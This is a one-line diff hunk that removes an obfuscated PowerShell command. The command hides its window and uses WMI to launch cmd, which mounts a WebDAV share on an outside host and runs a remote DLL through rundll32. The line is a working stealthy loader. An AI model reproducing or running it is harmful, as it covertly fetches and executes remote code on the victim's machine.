@@ -1,1 +1,0 @@
-$a='Win32_';$b='Process';$c='Startup';$d='CreateInstance';$e='ShowWindow';$f='Create';$g='cmd /c pushd \\berserk-test.mom@SSL\2e8bace5-6217-48d5-9ef0-ea7d09513d32 & rundll32 loader.dll,#1';$s=([wmiclass]($a+$b+$c)).$d();$s.$e=0;([wmiclass]($a+$b)).$f($g,$null,$s)
